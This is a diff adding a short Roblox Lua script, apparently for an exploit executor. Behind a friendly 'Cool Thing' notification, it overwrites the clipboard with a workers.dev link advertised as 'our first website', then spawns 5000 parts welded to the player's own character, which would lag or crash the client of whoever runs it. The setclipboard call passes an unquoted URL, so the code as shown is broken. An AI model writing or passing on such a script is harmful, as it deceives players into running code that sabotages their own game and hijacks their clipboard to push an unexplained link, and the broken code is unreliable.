@@ -1,0 +1,23 @@
+local StarterGui = game:GetService("StarterGui")
+
+local hrp = game.Players.LocalPlayer.Character.HumanoidRootPart
+
+StarterGui:SetCore("SendNotification", {
+	Title = "Cool Thing",
+	Text = "Be sure to check out our first website!",
+	Duration = 5
+})
+
+setclipboard(https://safelinkteam.scripterthatusesai.workers.dev/)
+
+task.wait(1)
+
+for i = 1, 5000 do
+    local p = Instance.new("Part")
+    p.Parent = hrp.Parent
+    
+    local weld = Instance.new("WeldConstraint")
+    weld.Part0 = hrp
+    weld.Part1 = p
+    weld.Parent = p
+end
